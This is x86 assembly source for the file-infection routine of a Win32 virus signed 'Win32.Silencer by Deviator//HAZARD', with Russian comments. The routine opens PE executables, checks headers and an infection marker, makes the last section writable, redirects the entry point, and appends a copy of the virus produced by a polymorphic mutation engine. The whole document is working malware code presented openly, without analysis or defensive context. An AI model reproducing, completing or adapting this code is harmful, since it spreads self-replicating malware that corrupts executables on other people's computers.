; Infection appenging to last section

InfectFile      proc
	Call	[CreateFile][ebp],edx,GENERIC_READ or GENERIC_WRITE,SHARE_READ,0,OPEN_EXISTING,0,0
	inc	eax				; Низзя ?
	jz	nextone
	dec	eax
	xchg	eax,ebx
	lea	edx,[need][ebp]			; Читаем header
	push	edx
	lea	ecx,[free][ebp]
	Call	[ReadFile][ebp],ebx,edx,40h,ecx,0
	pop	edi
	mov	ax,'ZM'
	scasw
	jnz	CloseIt
	lea	edi,[need][12h][ebp]
	mov	ax,'DM'
	scasw
	jz	CloseIt

	mov	eax,4 ptr [need][3Ch][ebp]
	mov	[peh][ebp],eax
	Call	[FSeek][ebp],ebx,eax,0,0	; на PE заголовок
	lea	edx,[need][ebp]
	push	edx
	lea	ecx,[free][ebp]
	Call	[ReadFile][ebp],ebx,edx,0F8h,ecx,0	; Читаем
	pop	edi
	mov	eax,'EP'			; PE ?
	scasd
	jnz	CloseIt

	movzx	eax,2 ptr [need][ebp][6]
	dec	eax
	mov	edx,28h
	xor	ecx,ecx
	mul	edx
	Call	[FSeek][ebp],ebx,eax,0,1
	mov	[fsec][ebp],eax			; Последняя секция

	lea	edx,[sects][ebp]
	lea	ecx,[free][ebp]
	Call	[ReadFile][ebp],ebx,edx,28h,ecx,0

	or	4 ptr [sects][ebp][24h],0C0000000h	; Read+Write

	mov	eax,4 ptr [sects][ebp][10h]
	add	eax,4 ptr [sects][ebp][14h]
	Call	[FSeek][ebp],ebx,eax,0,0		; в конец секции

	mov	eax,4 ptr [need][ebp][28h]
	add	eax,4 ptr [need][ebp][34h]
	mov	4 ptr [OldHost][ebp],eax

	mov	eax,4 ptr [sects][ebp][0Ch]
	add	eax,4 ptr [sects][ebp][10h]
	mov	4 ptr [need][ebp][28h],eax

	push	ebx
	lea	esi,[VTbl][ebp]	
	mov	ebx,offset VEntry
	mov	ecx,offset FLen
	mov	eax,offset VEntry
	sub	ecx,eax
	lea	edx,[VEntry][ebp]
	lea	eax,[VLen][ebp]

	mov	edi,edx			; Хитрые манипуляции с аддресом
	add	edi,ecx			; переменной за пределом вируса
	add	edi,2
	push	edi

	Call	DME
	pop	edi
	pop	ebx

	sub	eax,edi
	
	mov	[cVirFullLen][ebp],ecx
	mov	[cVirLen][ebp],eax

	mov	eax,[cVirFullLen][ebp]
	shl	eax,2
	add	4 ptr [sects][ebp][8],eax

	add	4 ptr [need][ebp][1Ch],eax
	add	4 ptr [need][ebp][50h],eax

	mov	eax,[cVirLen][ebp]
	mov	ecx,4 ptr [need][ebp][38h]
	xor	edx,edx
	div	ecx
	sub	ecx,edx
	push	ecx ecx
	add	ecx,[cVirLen][ebp]
	add	4 ptr [sects][ebp][10h],ecx

	push	edi
	lea	edx,[free][ebp]
	Call	[WriteFile][ebp],ebx,edi,[cVirLen][ebp],edx,0
	pop	edi
	pop	ecx
	push	edi
	xor	eax,eax
rep	stosb
	pop	edi ecx
	lea	edx,[free][ebp]
	Call	[WriteFile][ebp],ebx,edi,ecx,edx,0

	Call	[FSeek][ebp],ebx,[fsec][ebp],0,0
	lea	eax,[sects][ebp]
	lea	edx,[free][ebp]
	Call	[WriteFile][ebp],ebx,eax,28h,edx,0

	Call	[FSeek][ebp],ebx,[peh][ebp],0,0
	lea	eax,[need][ebp]
	lea	edx,[free][ebp]
	Call	[WriteFile][ebp],ebx,eax,0F8h,edx,0

	Call	[FSeek][ebp],ebx,12h,0,0
	lea	eax,[dm][ebp]		; Обломно было что-то придумывать
	lea	edx,[free][ebp]
	Call	[WriteFile][ebp],ebx,eax,2,edx,0
CloseIt:
	Call	[CloseHandle][ebp],ebx
nextone:	
        ret
InfectFile      endp

cVirLen	dd	0
fsec	dd	0
peh	dd	0
cVirFullLen	dd	0

dm	db	'DH'

	db	'Win32.Silencer by Deviator//HAZARD'
